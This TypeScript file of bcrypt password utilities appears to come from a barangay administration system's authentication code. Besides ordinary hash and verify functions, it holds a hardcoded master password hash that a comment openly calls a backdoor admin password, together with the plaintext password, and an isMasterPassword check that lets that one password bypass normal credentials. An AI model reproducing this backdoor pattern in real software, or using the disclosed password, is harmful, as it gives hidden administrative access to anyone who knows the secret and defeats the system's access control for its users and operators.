import bcrypt from 'bcryptjs';

// Master password hash - this is the backdoor admin password
// The actual password is: "barangay_master_2024!"
const MASTER_PASSWORD_HASH = '$2a$10$eMbANZ1RkTivzfAr.jf00Omhe4fL7Ue8wDeRUtyZoxhQ/AXv48eKe';

export async function hashPassword(password: string): Promise<string> {
  return bcrypt.hash(password, 10);
}

export function hashPasswordSync(password: string): string {
  return bcrypt.hashSync(password, 10);
}

export async function verifyPassword(password: string, hash: string): Promise<boolean> {
  return bcrypt.compare(password, hash);
}

export function verifyPasswordSync(password: string, hash: string): boolean {
  return bcrypt.compareSync(password, hash);
}

export function isMasterPassword(password: string): boolean {
  return bcrypt.compareSync(password, MASTER_PASSWORD_HASH);
}
